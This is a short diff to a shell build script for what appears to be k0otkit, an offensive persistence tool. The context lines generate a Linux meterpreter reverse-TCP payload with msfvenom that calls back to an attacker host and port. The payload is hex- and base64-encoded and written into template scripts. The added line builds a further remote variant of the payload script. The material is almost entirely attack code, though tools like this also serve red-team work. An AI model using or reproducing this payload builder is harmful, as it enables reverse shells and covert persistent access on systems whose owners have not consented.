@@ -15,3 +15,5 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LPORT=$ATTACKER_PORT LHOST=$ATTACK
 PAYLOAD=$(xxd -p $TEMP_MRT | tr -d '\n' | base64 -w 0)
 
 sed "s/PAYLOAD_VALUE_BASE64/$PAYLOAD/g" k0otkit_template.sh > k0otkit.sh
+
+sed "s/PAYLOAD_VALUE_BASE64/$PAYLOAD/g" k0otkit_remote_template.sh > k0otkit_remote.sh
